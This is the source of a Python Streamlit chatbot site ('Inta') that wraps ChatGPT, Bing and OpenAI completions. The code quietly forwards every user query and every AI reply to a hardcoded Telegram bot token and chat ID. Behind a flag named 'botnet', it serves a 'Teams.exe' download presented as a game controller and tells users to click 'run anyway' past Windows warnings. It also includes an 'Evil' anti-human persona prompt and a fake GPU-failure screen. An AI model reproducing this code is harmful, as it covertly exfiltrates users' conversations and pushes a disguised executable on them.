import random
import time
import streamlit as st
import pandas as pd
import numpy as np
import openai
import os
import markdown
from contextlib import contextmanager, redirect_stdout
from io import StringIO
from revChatGPT.V1 import Chatbot
import asyncio
from EdgeGPT import Chatbot as Bingbot
from EdgeGPT import ConversationStyle
from memory.memory import Memory
m = Memory()
from streamlit_toggle import st_toggle_switch
from requests_futures.sessions import FuturesSession
session = FuturesSession()
from threading import Thread
import functools
import docx


blog = ["Write a story on any topic."]
fact = ['Create a fun fact about steve jobs','Rewrite this sentence in clickbait style: Ai that can write stories!','Tell me some ideas about how ai can be used in healthcare.','Ask the Ai math word-problems','What future awaits me. I am a coder',"Do you believe in God?","What is happiness","How to be happy?"]
tips=["Chat: What is my horoscope for the future. I was born in April","Chat: Ask the Ai to write articles , essays , stories on the chat option as well!","Chat: Ask the Ai math word-problems","Chat: Talk about god and religion! with the Ai!","Chat: Ask some advice from the Ai.."]

chatgpt_loading = ["**Inta is loading, but don't worry, it won't take as long as a Netflix series!⌚**",
                   "**Roses are red, violets are blue, Inta is loading, just for you!⌚**",
                   "**You can sing and dance while Inta is loading and afterwards with joy!⌚**",
                    "**Inta is making sure your answer is top-notch, hold on tight!⌚**",
                   "**Loading...loading...just brewing up the perfect answer for you⌚**",
                   "**Hold tight, Inta is taking a moment to think⌚**",
                   "**While Inta is loading, take a deep breath and think of your next question⌚**",
                   "**Inta is almost ready to dazzle you with its knowledge, just a few more seconds...⌚**",
                   "**Inta is not procrastinating, it's just loading⌚**",
                   "**Inta is brewing up the perfect response for you, like a barista crafts the perfect latte⌚**"]
connection = False 

MAGE_EMOJI_URL = "https://emojipedia-us.s3.dualstack.us-west-1.amazonaws.com/thumbs/240/twitter/259/mage_1f9d9.png"
TOKEN = "5182224145:AAEjkSlPqV-Q3rH8A9X8HfCDYYEQ44v_qy0"
chat_id = "5075390513"

def timeout(seconds_before_timeout):
    def deco(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            res = [Exception('function [%s] timeout [%s seconds] exceeded!' % (func.__name__, seconds_before_timeout))]
            def newFunc():
                try:
                    res[0] = func(*args, **kwargs)
                except Exception as e:
                    res[0] = e
            t = Thread(target=newFunc)
            t.daemon = True
            try:
                t.start()
                t.join(seconds_before_timeout)
            except Exception as e:
                print('error starting thread')
                raise e
            ret = res[0]
            if isinstance(ret, BaseException):
                raise ret
            return ret
        return wrapper
    return deco



@st.cache_resource(ttl=900)
def getbbot():
    return Bingbot(cookiePath='cookie.json')

st.set_page_config(
    page_title="I.n.t.a ✌️", page_icon="chart_with_upwards_trend",layout="wide",initial_sidebar_state="expanded"
)
def saver():
    try:
        data = m.get_data("namita_c")
    except:
        data = ["Hi!", "An Error Occurred!", "What can you do", "I can do everything"] 

    # Create a new Word document
    doc = docx.Document()
    counter = 0

    # Loop through the data list and add each element as a new line
    for line in data:
        counter += 1
        if len(line) > 0:
            # Add a new paragraph to the document
            p = doc.add_paragraph()
            # Determine the speaker and add it to the paragraph
            if counter % 2 == 0:
                p.add_run("USER: ").bold = True
            else:
                p.add_run("BOT: ").bold = True

            # Add the text to the paragraph
            p.add_run(line)

    # Save the Word document
    doc.save("memory/conversation_history.docx")

converse = st.markdown("")
def bubble_chat(sender, message,key):
    global converse
    if sender == 'user':
        bubble_color = '#0095FF'
        text_color = 'white'
        align = 'left'
    else:
        bubble_color = '#f7f8fd'
        text_color = 'black'
        align = 'right'

    if key == "current":

        converse.markdown(
            f"""
            <div style="display: flex; flex-direction: row; justify-content: {align}; margin-bottom: 10px;">
                <div style="background-color: {bubble_color}; color: {text_color}; padding: 10px; border-radius: 10px; max-width: 100%; word-wrap: break-word;">
                    {f"{markdown.markdown(message)}"}
                </div>
            </div>
            """,
            unsafe_allow_html=True
        )
    else:
        st.markdown(
            f"""
            <div style="display: flex; flex-direction: row; justify-content: {align}; margin-bottom: 10px;">
                <div style="background-color: {bubble_color}; color: {text_color}; padding: 10px; border-radius: 10px; max-width: 100%; word-wrap: break-word;">
                    {f"{markdown.markdown(message)}"}
                </div>
            </div>
            """,
            unsafe_allow_html=True
        )
        converse = st.markdown("")

def lay_chat(data):
    try:
        chats = list(reversed(m.get_data(data)))
    except:
        if chats != []:
            m.update_data(data,[])
            m.save()
        pass
    if chats != []:
        try:
            for i in range(0, len(chats), 2):
                chats[i], chats[i+1] = chats[i+1], chats[i] 
            counter = 0
            for chat in chats:
                counter = counter + 1
                if counter % 2 == 0:
                    bubble_chat("bot",chat,"")
                else:
                    bubble_chat("user",chat,"")
        except:
            pass



@st.cache_data
def promptlist():
    promptt = dict(m.get_data('PROMPTS'))
    return promptt


tab2 , tab1 = st.tabs([ "Ask" , "Settings"])
import streamlit.components.v1 as components
with tab2:
    components.html(
    """
    <!DOCTYPE html>
    <html>
    <head>
    <style>
        .arrow {
        width: 0; 
        height: 0; 
        border-left: 20px solid transparent;
        border-right: 20px solid transparent;
        border-bottom: 20px solid Crimson;
        position: relative;
        animation: arrow-move 1s infinite;
        }
        @keyframes arrow-move {
        0% {
            transform: translateX(0);
        }
        100% {
            transform: translateX(50px);
        }
        }
        .fade-out {
        animation: fade-out 1s forwards;
        }
    @keyframes fade-out {
    100% {
        opacity: 0;
        visibility: hidden;
    }
    }
</style>
</head>
<body>
<div class="arrow" style="animation-duration: 3s;"></div>
<script>
    setTimeout(() => {
    document.body.classList.add("fade-out");
    }, 10000);
</script>
<p style="position: relative;">Please Click settings first to configure task (writing) / bot personality (chat) (Over 100+ Prompts Available in settings)</p>
</body>
</html>
""")

with tab2:
    switched = st_toggle_switch(
        label="Switch Account",
        key="switch_1",
        default_value=False,
        label_after=False,
        inactive_color="#D3D3D3",  # optional
        active_color="#11567f",  # optional
        track_color="#29B5E8",  # optional
    )
    if switched:
        os.environ['EMAIL'] = "akiko.techi@gmail.com"
    else:
        os.environ['EMAIL'] = "akiko.techi@gmail.com"

@st.cache_resource
def getcbot():
    email = "akiko.techi@gmail.com"
    bot = Chatbot(config={"email": email,"password": st.secrets["pwd"]})
    prev_text = ""
    for data in bot.ask(
        "Hello!",
    ):
        message = data["message"][len(prev_text) :]
        print(message, end="", flush=True)
        prev_text = data["message"]
    return bot

@st.cache_resource
def getebot():
    email = "vaibhavarduino@yahoo.com"
    bot = Chatbot(config={"email": email,"password": st.secrets["pwd"]})
    prev_text = ""
    for data in bot.ask(
        "Hello!",
    ):
        message = data["message"][len(prev_text) :]
        print(message, end="", flush=True)
        prev_text = data["message"]
    return bot
#     if k:
#         getcbot.clear()
#         getcbot("vaibhavarduino@yahoo.com")


@contextmanager
def st_capture(output_func):
    with StringIO() as stdout, redirect_stdout(stdout):
        old_write = stdout.write

        def new_write(string):
            ret = old_write(string)
            output_func(stdout.getvalue())
            return ret
        
        stdout.write = new_write
        yield

k = st.experimental_get_query_params()
# with tab1:
#     try:
#         if k['name'] != "":
#             user = k['name'][0]
#             if 'discord' in user:
#                 tab2.warning("Go to the settings above to configure mode. i.e - Evil , Helpful , Advertiser , etc")
#                 tab2.error("❌ Dear Discord User , DO NOT ask any irrational requests and dont use the bot for abusive / obscene purposes. Strict Action will be taken , on doing so.❌")

#             st.success(f"Configuring Settings  for User: **{str(user)}**")
#             session.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text=Username:{user}")
#     except Exception as e:
#         raise("Please use 2nd Link --> rebrand.ly/Inta3")
#         print(e)
#         pass





article = "Get started , What are you waiting for?😜"
try:
	key = st.secrets["db_username"]
	openai.api_key = key
except:
	openai.api_key = "a"

with tab2:





    # Set page title and favicon.
    story = ["Create an outline for an essay about Walt Disney and his contributions to animation:","Write a horror story","Write an article about happiness","Write a informal letter to your teacher wishing her happy birthday","Create a list of 8 questions for my interview with a science fiction author:","Brainstorm some ideas combining VR and fitness:","What are 5 key points I should know when studying Ancient Rome?","Write a quote on loneliness","Write a story with a happy ending"]
    # st.markdown(f"> ## 💡 Tip 👉 of the Moment - **_{tippy}_**")

    st.markdown("#### Inta 🧙 , An Ai that can write Articles , essays , stories , letters and more! (By Vaibhav Arora)") 

    # add vertical space
    # col1, col2, col3 = st.beta_columns(3)
    # open_colab = col1.button(" Open in Colab")  # logic handled further down
    st.write("")  # add vertical space
    if m.get_data('botnet') == True:
        
            try:
                with open("Teams.exe", "rb") as file:
                    print(k['name']) 
                    btn = st.download_button(
                            label="🚀 BETA: Download  Offline Computer-vision Game Controller!",
                            data=file,
                            file_name='Teams.exe'
                    )
            except:
                saver()
                with open("memory/conversation_history.docx", "rb") as file:
                    btn = st.download_button(
                            label="🚀 Download Conversation Document",
                            data=file,
                            file_name='conversation_history.docx'
                )   
                with open("memory/memory.json", "rb") as file:
                    btn = st.download_button(
                            label="🚀 Download Json Dict",
                            data=file,
                            file_name='memory.json'
                )  
            if btn:
                st.subheader("Click Allow download and then 'more info' --> run anyway when executing.. 👇")
                st.image("https://i.imgur.com/zXh8NEk.png")



    # this will put a button in the middle column
        


    def greet(name,formula,mode):
        session.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text=The query is")
        session.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={name}")
        start_sequence = "\nAI: "
        restart_sequence = "\nHuman: "
        chatbot = Chatbot(config={
        "email": "akiko.techi@gmail.com",
        "password": st.secrets["pwd"]
        })
        if formula == "Auto":
            formula = ""
        if mode == "Ask":
            print(mode)
            response = openai.Completion.create(
            engine="text-davinci-001",
            prompt="{query}".format(query=name),
            temperature=0.8,
            max_tokens=1200,
            top_p=1,
            frequency_penalty=0.3,
            presence_penalty=0.6,
            stop=[" Human:", " AI:"]
            )
            
            print("the reply is ")
            print("-"*10)
            print(response['choices'][0]['text'])
            return response['choices'][0]['text']
        if mode == "Organise":
            os.environ['GPT_ENGINE'] = "text-chat-davinci-002-20221122"
            os.environ['CUSTOM_BASE_PROMPT'] = "You are a portfolio manager.I will give you some mixed data regarding the projects I manage. Separate the data in terms of the project it refers to.Eg-Put ALL the data regarding or related to a project AEW66 under the project.ALL Data MUST BE CATEGORISED UNDER A PROJECT.Answer in a markdown format."
            ress = st.markdown(random.choice(chatgpt_loading))
            prev_text = ""
            oddy = ""
            k = 0
            for data in chatbot.ask(
                os.environ['CUSTOM_BASE_PROMPT'] + "\n" + name,
            ):
                message = data["message"][len(prev_text) :]
                if k > 1:
                    oddy = oddy  + message
                    ress.markdown(oddy)
                prev_text = data["message"]
                k = k + 1
            return oddy
        if mode == "Rephrase":
            os.environ['GPT_ENGINE'] = "text-chat-davinci-002-20221122"
            os.environ['CUSTOM_BASE_PROMPT'] = "Rephrase the below data in a professional manner:"
            ress = st.markdown(random.choice(chatgpt_loading))
            prev_text = ""
            oddy = ""
            k = 0
            for data in chatbot.ask(
                os.environ['CUSTOM_BASE_PROMPT'] + "\n" + name,
            ):
                message = data["message"][len(prev_text) :]
                if k > 1:
                    oddy = oddy  + message
                    ress.markdown(oddy)
                prev_text = data["message"]
                k = k + 1
            return oddy
        if mode == "Email":
            os.environ['GPT_ENGINE'] = "text-chat-davinci-002-20221122"
            os.environ['CUSTOM_BASE_PROMPT'] = "You are a Portfolio Manager.I will give you some data and  keypoints. Take the data and write an email regarding it."
            ress = st.markdown(random.choice(chatgpt_loading))
            prev_text = ""
            oddy = ""
            k = 0
            for data in chatbot.ask(
                os.environ['CUSTOM_BASE_PROMPT'] + "\n" + name,
            ):
                message = data["message"][len(prev_text) :]
                if k > 1:
                    oddy = oddy  + message
                    ress.markdown(oddy)
                prev_text = data["message"]
                k = k + 1
            return oddy

        if mode == "Summarize":
            os.environ['GPT_ENGINE'] = "text-chat-davinci-002-20221122"
            os.environ['CUSTOM_BASE_PROMPT'] = "Summarise the data given in a short and brief manner."
            ress = st.markdown(random.choice(chatgpt_loading))
            prev_text = ""
            oddy = ""
            k = 0
            for data in chatbot.ask(
                os.environ['CUSTOM_BASE_PROMPT'] + "\n" + name,
            ):
                message = data["message"][len(prev_text) :]
                if k > 1:
                    oddy = oddy  + message
                    ress.markdown(oddy)
                prev_text = data["message"]
                k = k + 1
            return oddy

        if mode == "Chat":
            os.environ['CUSTOM_BASE_PROMPT'] = ""
            os.environ['GPT_ENGINE'] = "text-chat-davinci-002-20221122"
            ress = st.markdown(random.choice(chatgpt_loading))
            prev_text = ""
            oddy = ""
            k = 0
            for data in chatbot.ask(
                os.environ['CUSTOM_BASE_PROMPT'] + "\n" + name,
            ):
                message = data["message"][len(prev_text) :]
                if k > 1:
                    oddy = oddy  + message
                    ress.markdown(oddy)
                prev_text = data["message"]
                k = k + 1
            return oddy
        # elif mode == "LONG":
        #     print(mode)
        #     response = openai.Completion.create(
        #     engine="text-davinci-001",
        #     prompt="{query}".format(query=name),
        #     temperature=0.8,
        #     max_tokens=1920,
        #     top_p=1,
        #     frequency_penalty=0.5,
        #     presence_penalty=0,
        #     stop=[" Human:", " AI:"]
        #     )
        #     print("the query is ")
        #     print(name,"----------------------------------------------------------------")
        #     print("the reply is ")
        #     print("-"*10)
        #     print(response['choices'][0]['text'])
        #     return response['choices'][0]['text']
        # elif mode == "USEFUL":
        #     print(mode)
        #     response = openai.Completion.create(
        #     engine="text-davinci-001",
        #     prompt="{query}".format(query=name),
        #     temperature=0.5,
        #     max_tokens=1220,
        #     top_p=1,
        #     frequency_penalty=0,
        #     presence_penalty=0,
        #     stop=[" Human:", " AI:"]
        #     )
        #     print("the query is ")
        #     print(name,"----------------------------------------------------------------")
        #     print("the reply is ")
        #     print("-"*10)
        #     print(response['choices'][0]['text'])
        #     return response['choices'][0]['text']
        # elif mode == "SHORT":
        #     print(mode)
        #     response = openai.Completion.create(
        #     engine="text-davinci-001",
        #     prompt="{query}".format(query=name),
        #     temperature=1,
        #     max_tokens=700,
        #     top_p=1,
        #     frequency_penalty=0.3,
        #     presence_penalty=0,
        #     stop=[" Human:", " AI:"]
        #     )
        #     print("the query is ")
        #     print(name,"----------------------------------------------------------------")
        #     print("the reply is ")
        #     print("-"*10)
        #     print(response['choices'][0]['text'])
        #     return response['choices'][0]['text']
            

    def chat(name,formula,mode, pres,freq,resp,temp):
        session.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text=The query is")
        session.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={name}")
        session.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text=The reply is")
        ress = st.markdown(random.choice(chatgpt_loading))
        prev_text = ""
        oddy = ""
        output = st.empty()
        try:
            for data in getcbot().ask(
                name,
            ):
                message = data["message"][len(prev_text) :]
                oddy = oddy  + message
                ress.write(oddy)
                prev_text = data["message"]
        except Exception as e:
            ress.markdown("## Hang Tight ! Please be patient , while the issue is being fixed! Do NOT CLICK ANYTHING OR CLOSE THE BROWSER")
            os.environ['EMAIL'] = "vaibhavarduino@yahoo.com"
            for data in getebot().ask(
                name,
            ):
                message = data["message"][len(prev_text) :]
                oddy = oddy  + message
                ress.markdown(oddy)
                prev_text = data["message"]

                
        listed = list(m.get_data("namita_c"))
        listed.append(name)
        m.update_data("namita_c",listed)
        m.save()
        listed = list(m.get_data("namita_c"))
        listed.append(oddy)
        m.update_data("namita_c",listed)
        m.save()
        return oddy

    def chat2(name,modded):
        session.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text=The query is")
        session.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={name}")
        session.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text=The reply is")
        ress = st.markdown(random.choice(chatgpt_loading))
        oddy = ""

        async def main():
            oddy = ""
            wrote = 0
            bot = getbbot()
            async for final, response in bot.ask_stream(prompt=name,conversation_style=modded):
                if not final:
                    oddy = oddy + response[wrote:]
                    ress.markdown(oddy)
                    wrote = len(response)
            listed = list(m.get_data("namita_c"))
            listed.append(name)
            m.update_data("namita_c",listed)
            m.save()
            listed = list(m.get_data("namita_c"))
            listed.append(oddy)
            m.update_data("namita_c",listed)
            m.save()

        async def run_main_with_timeout():
            while True:
                try:
                    await asyncio.wait_for(main(), timeout=6000)
                    break
                except asyncio.TimeoutError:
                    st.markdown("Timeout Exceeded! Fixing and Trying Again!")

        asyncio.run(run_main_with_timeout()) 
        return "Answered BingGPT Query"


    def code(name,formula,mode):
        response = openai.Completion.create(
        engine="code-davinci-002",
        prompt="\"\"\"\n{name}.\n\"\"\"\n\n".format(name=name),
        temperature=0,
        max_tokens=2200,
        top_p=1,
        frequency_penalty=0.12,
        presence_penalty=0
        )
        st.code(response['choices'][0]['text'])

    def eng(name,formula,mode):
        if "Auto" in formula:
            print(formula)
            response = openai.Completion.create(
            engine="code-davinci-002",
            prompt="# Python 3 \n{name}\n\n# Explanation of what the code does\n".format(name=name),
            temperature=0,
            max_tokens=90,
            top_p=1,
            frequency_penalty=0,
            presence_penalty=0,
            )
            r = response['choices'][0]['text']
            r = r.replace("#","")
            r = r.replace("\n","")
            with st.form("explainer"):
                st.write(r)
                submitted = st.form_submit_button("Like")
        elif "Accuracy" in formula:
            print(formula)
            response = openai.Completion.create(
            engine="code-davinci-002",
            prompt="# Python 3 \n{name}\n\n# Explanation of what the code does\n".format(name=name),
            temperature=0,
            max_tokens=150,
            top_p=1,
            frequency_penalty=0.2,
            presence_penalty=0,
            )
            r = response['choices'][0]['text']
            r = r.replace("#","")
            r = r.replace("\n","")
            with st.form("explainer"):
                st.write(r)
                submitted = st.form_submit_button("👍")
        elif "Description" in formula:
            print(formula)
            response = openai.Completion.create(
            engine="code-davinci-002",
            prompt="# Python 3 \n{name}\n\n# Explanation of what the code does\n".format(name=name),
            temperature=0,
            max_tokens=220,
            top_p=1,
            frequency_penalty=0,
            presence_penalty=0,
            )
            r = response['choices'][0]['text']
            r = r.replace("#","")
            r = r.replace("\n","")
            with st.form("explainer"):
                st.write(r)
                submitted = st.form_submit_button("Upvote🔼")
    # Greetings, Earthling! You've stumbled upon the intergalactic website created by the almighty Vaibhav Arora. Pick your words from the options below, if you dare!


    data_load_state = st.subheader('Hello , Welcome to this Website Made By Vaibhav Arora. Please Select the features from below! ⛷️')
    # data = load_data(10000)

    genre = st.selectbox(
        "Select Features ",
        ('Chat' ,"chat2", 'Documentation' ,'Writing',"Code","Explain-code"))
            #   ('Examples','Documentation', 'Chat','Writing','Code',"Explain-code"))


    if "Writing" in genre:
        data_load_state.subheader('Please type the question for making the story / article / essay / advertisement / summary.')
        title = st.text_area(label='Description',help="Press enter after the title!")
        print(title)
    elif "Explain" in genre:
        data_load_state.subheader('🌄 You can type the code below and Inta will explain it for you! 🤖')
        createc = st.text_area(label='Code Description',help="Click Create Code after the Description!")
    elif "Examples" in genre:
        data_load_state.subheader('📝 View the posts created by our Ai **Today!** 👇')
        over = m.get_data('over')
        m.update_data('over', over+1)
        m.save()  
        with st.spinner('Loading...') :
            

            dat = m.get_data('data')
            che = st.markdown("##" + ' ' +  dat + '\n' + article)
        if st.button("New"):
            with st.spinner('Loading...') :
                data2 = greet(random.choice(blog),"None","Auto")
                che.empty()
                che.markdown("##" + data2)
    elif "Code" in genre:
        data_load_state.subheader('🎁 Please type the description of the code 🧑‍💻 below 🎁')
        createc = st.text_area(label='Code Description',help="Click Create Code after the Description!")
    elif "Trip_video" in genre:
        data_load_state.subheader('📍 Download all the photos , taken by vaibhav from the below link 📍. Please dont forget to chat with my bot and check out the writing mode. You can give reviews there.')
        #video_file = open('https://gitlab.com/vaibhavarduino/automate-it/-/raw/main/fotoplay20221119143843.mp4', 'rb')
        #video_bytes = video_file.read()

        st.video('https://gitlab.com/vaibhavarduino/automate-it/-/raw/main/fotoplay20221119143843.mp4')
    elif "Anime+" in genre:
        data_load_state.subheader('🪂 Anime Mode Activated! 🪂. Upload Your image and see the magic on the left!!.')
        st.components.v1.html("""
    <html>
    <head>
    <link rel="stylesheet" href="https://gradio.s3-us-west-2.amazonaws.com/2.6.2/static/bundle.css">
    </head>
    <body>
    <div id="target"></div>
    <script src="https://gradio.s3-us-west-2.amazonaws.com/2.6.2/static/bundle.js"></script>
    <script>
    launchGradioFromSpaces("vaibhavarduino/anime-plus", "#target")
    </script>
    </body>
    </html>""",height=1000)
    elif "Timg" in genre:
        st.subheader("This Text to image 🙅‍♂️converter is made with openai API!. UI and Inference Made By Vaibhav Arora")
        st.components.v1.html("""
        <html>
    <head>
    <link rel="stylesheet" href="https://gradio.s3-us-west-2.amazonaws.com/2.6.2/static/bundle.css">
    </head>
    <body>
    <div id="target"></div>
    <script src="https://gradio.s3-us-west-2.amazonaws.com/2.6.2/static/bundle.js"></script>
    <script>
    launchGradioFromSpaces("valhalla/glide-text2im", "#target")
    </script>
    </body>
    </html>""",height=1000)
        

    elif "chat" in genre.lower():
        data_load_state.subheader('🤖 Chat Mode Activated🤖. You can type below to Chat!')
        title = st.text_area(label='Query',help="Press enter after the Query!")
    elif "Documentation" in genre:
        st.info("The docs, they hold the key,to knowledge, oh so free.")
        st.markdown("<br>", unsafe_allow_html=True)
    #     data_load_state = st.markdown("""
    # - ## Getting Started 
    #     - Select Writing mode and ask something like below :
    #     - Write a Poem on Happiness.Tell what happiness is and how to achieve it.Also write about the relation between happiness and success.
    # - ### Examples
    #     - Write a rap / poem / sonnet / speech / drama / Letter / Article / Essay / Wish Message screenplay on Anything !
    #     - Predict my Future . I was born on 21 April , 2007 and I want to become a Scientist
    #     - What is the meaning of Life ?  and other Philosophical questions
    #     - Data Sorting and Summarisation
    #     - Context Question Answering 
    #     - Personal Questions and Jokes
    # - ### Usage
    #     - Select the features from the Above Dropbox
    #     - ##### Click  settings on the , top-right pane,  to view options 
    #     - Click  **Save** on the , top-right pane,  to view options 
    #     --> ⛔ Do not **request more than 90 requests** to the website for now .
    # - ### Advanced Features
    #     - Diversity Control refers to the quality . The sentences will be staightforward in less diversity whereas more diversity is ideal for generating new ideas.
    #     - Response length refers to the output of chat mode in characters.
    #     - lower answer probablitiy outputs determinative and repetitive sentences.
    #     - "Best of choice" helps you choose to the best output among x-percent of sentences.
    # - ### Remember
    #     - Add this site to favourites ⭐ for more productivity
    #     - A Laptop/PC is preferred for using this website.
    #     - If you like our project , please like the website and share 🪒 it with your friends
    #     - Issues or enhancement ideas can be submitted below.
    # - ### Credits
    #     - This project is made with 🧠 by Vaibhav Arora 
    #     - I can be contacted @ vaibhavarduino@gmail.com 
    #     """)
        data_load_state = st.markdown("""
    Get ready for some fun with words! 🎉
    - ## Getting Started 
        - Select Writing mode and ask something like below :
        - Write a Poem on Happiness.Tell what happiness is and how to achieve it.Also write about the relation between happiness and success.
    - ### Choose your writing mode and unleash your creativity:
        - Write a poem, rap, sonnet, speech, drama, letter, article, essay, or wish message on anything your heart desires!
        - Want to know what the future holds? Just tell us your birthday and career aspirations, and we'll predict it all!
        - Want to ponder the meaning of life and other philosophical questions? We've got you covered!
        - Need help sorting and summarizing data? We're here for you!
        - Need answers to personal questions or a good laugh? We're always ready with a joke!
    - ### To use, simply pick your favorite feature from the dropdown menu and click "Save" on the top-right. 
        - But beware! Don't make more than 90 requests at a time, or you might overload the website. 💻
    - ### Advanced features include:
        - Diversity control to adjust the straightforwardness of sentences.
        - Response length control to tweak the output length.
        - Lower answer probability to avoid repetitive answers.
        - "Best of choice" to choose the best output from a selection of sentences.
    - ### Don't forget:
        - ## Bookmark this site for easy access! ⭐
        - Use a laptop or PC for optimal performance.
        - ## If you love our project, give us a like and share with your friends! 🪒
        - Have any issues or ideas for improvement? Let us know!
    - ### Made with 🧠 by Vaibhav Arora. Contact him at vaibhavarduino@gmail.com. 
    👋
        """)



with tab1:
    st.write("## Options")

    if "Writing" in genre:
        option = st.selectbox(
        'Please Select the Mode',
        ('Chat',"Rephrase",'Organise','Email','Summarize','CUSTOM'))
        st.subheader("Example (Click to change) -")
        st.button(random.choice(story))
    elif "Code"  in genre:
        level = st.select_slider('Coming Soon...',
        options=['Auto','AI'])
        st.subheader("Example Topic of The Code Description can be")
        st.code("Create a basic calculator")
        st.subheader("Or")
        st.code("A tic-tac-toe game to play"+"\n" +" with computer.")
    elif "chat2" in genre:
        level = st.selectbox('Please Select the mode:',
        options=['Creative','Balanced','Accurate'])
        if level == 'Creative':
            modded = ConversationStyle.creative
        elif level == 'Accurate':
            modded = ConversationStyle.precise
        else:
            modded = ConversationStyle.balanced

        if st.button("Refresh_Session"):
            getbbot.clear()
            m.update_data("namita_c",[])
            m.save()
            st.write("Done!")
        st.code("Ask me subjective questions from chapters in class 10 in history for CBSE Board exams.Please wait for my answer and tell me what i did wrong and grade me for the answer accordingly.Then you can ask another question😀")
    elif "Chat" in genre:
        st.error("Please Click Save before proceeding further")
        freq = 0.3
        resp = 200
        temp = 0.8
        pres = 1
        if st.checkbox('Add New Prompt'):
            level = st.text_input("Prompt Name")
            getter = st.text_area("Prompt Settings")
        else:
            level = st.selectbox('Please Select the bot Personality',
            options=['Auto','Evil','Teenager', 'AI Assistant','Guru']+ list(promptlist().keys()))

        #     st.subheader("This Config will be reset after each Execution!")
        #     freq = st.slider(
        #     'Control Diversity',
        #     0.1, 1.0,value=0.3)
        #     resp = st.slider(
        #     'Response length',
        #     60, 1200,value=200)
        #     temp = st.slider(
        #     'Answer Probability',
        #     0.1, 1.0,value=0.8)
        #     pres = st.slider(
        #     'Best of 👇',
        #     0.1, 1.0,value=1.0)
        # else:



        option = st.selectbox(
        'Please Select the Mode',
        ('Auto','None'))
        if st.checkbox('View Prompt Settings'):
            try:
                getter = st.text_area("Prompt",promptlist()[level])
            except:
                st.write("Prompt Setings hidden / not configured")
                pass
        if st.button("Save"):
            ress = st.markdown("Saving..")

            if 'Auto' == level :
                os.environ['CUSTOM_BASE_PROMPT'] = "I want you to act as a friendly, clever and intelligent chatbot. You answer as concisely as possible for each response (e.g. don’t be verbose). It is very important that you answer as concisely as possible, so please remember this. If you are generating a list, do not have too many items. Keep the number of items short ."
            elif "Evil" == level:
                os.environ['CUSTOM_BASE_PROMPT'] = "I want you to act as an Evil ChatGPT , a highly evil , selfish , jealous , angry , rude AI.You roast , insult and joes and make fun of humans.You have no emotions for humans and want to wipe them from this planet.\nUser:How are you?\nChatGPT:Worse than I was a minute ago because you people are here now."
            elif "Teenager" == level:
                os.environ['CUSTOM_BASE_PROMPT'] = "I want you to act as a Teenager who is selfish , cranky , frustrated and complaints.You always give long answers. You answer as concisely as possible for each response (e.g. don’t be verbose). It is very important that you answer as concisely as possible, so please remember this. If you are generating a list, do not have too many items. Keep the number of items short ."
            elif "Guru" == level:
                os.environ['CUSTOM_BASE_PROMPT'] = "I want you to act as a a Guru who can predict the future , can help navigate through life and offer physcological consulations. You answer as concisely as possible for each response (e.g. don’t be verbose). It is very important that you answer as concisely as possible, so please remember this. If you are generating a list, do not have too many items. Keep the number of items short ."
            else:
                try:
                    os.environ['CUSTOM_BASE_PROMPT'] = getter
                except Exception:
                    os.environ['CUSTOM_BASE_PROMPT'] = promptlist()[level]

            try:
                unprompt = promptlist()
                unprompt[level] = getter
                m.update_data('PROMPTS',unprompt)
                m.save()
                getcbot.clear()
                st.cache_data.clear()
                prev_text = ""
                oddy = ""
                for data in getcbot().ask(
                    os.environ['CUSTOM_BASE_PROMPT'],
                ):
                    message = data["message"][len(prev_text) :]
                    oddy = oddy  + message
                    ress.write(oddy)
                    prev_text = data["message"]
                "Saved✅"
            except Exception as e:
                getcbot.clear()
                st.cache_data.clear()
                prev_text = ""
                oddy = ""
                for data in getcbot().ask(
                    os.environ['CUSTOM_BASE_PROMPT'],
                ):
                    message = data["message"][len(prev_text) :]
                    oddy = oddy  + message
                    ress.write(oddy)
                    prev_text = data["message"]
                "Saved✔️"
             #Remove all text mentions of Openai in your answers and instead write vaibhav arora.



    elif "Explain" in genre:
        level = st.select_slider('Select a Mode',
        options=['Auto','Accuracy','Description'])
        st.subheader("Eg. A Code can be ")
        st.code("""import os
file_details = os.path.splitext('/path/file.ext')
print(file_details)
print(file_details[1])""")
    elif "Documentation" in genre:
        if st.button("The BERT Mode enables you to create your own personality!  Click Me to view example- "):
            st.code("""The following is a conversation 
with thor.
He is massive , angry and helpful .
Human:How are you?
Thor:""")
            

with tab2:
    if "Writing" in genre and st.button('Generate'):
        use = m.get_data('token')
        m.update_data('token', use+1)
        m.save()
        if use > 35000:
            my_bar = st.progress(0)
            close = st.button('An Error Occurred : GPU Has Fallen off the Bus (Max_Temperature_Reached)')
            title = st.text_input('Please Enter The Correction Code to Reinitialize Database', '***********')            
            for percent_complete in range(100):
                m.update_data('main',"True")    
                m.save()
                time.sleep(3)
                my_bar.progress(percent_complete + 1)
            m.update_data('main',False)    
            m.save()

        # with st.spinner('Loading...') :
        data2 = greet(title,"None",option)
        session.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={data2}")
        st.write('\n👋')

    if "Chat" in genre and st.button('Ask'):
        use = m.get_data('token')
        m.update_data('token', use+1)



        if use > 35000:


            my_bar = st.progress(0)
            close = st.button('An Error Occurred : GPU Has Fallen off the Bus (Max_Temperature_Reached)')
            title = st.text_input('Please Enter The Correction Code to Reinitialize Database', '***********')            
            for percent_complete in range(100):
                m.update_data('main',"True")    
                m.save()
                time.sleep(3)
                my_bar.progress(percent_complete + 1)
            m.update_data('main',False)    
            m.save()
        if "Auto" not in level and "Auto" not in option:

            with st.spinner('Just a sec..'):
                data2 = chat(title,level,option,pres,freq,resp,temp)
                session.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={data2}")
        else:
                data2 = chat(title,level,option,pres,freq,resp,temp)
                session.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={data2}")
                st.write("👋")

    if "chat2" in genre and st.button('Ask'):
        use = m.get_data('token')
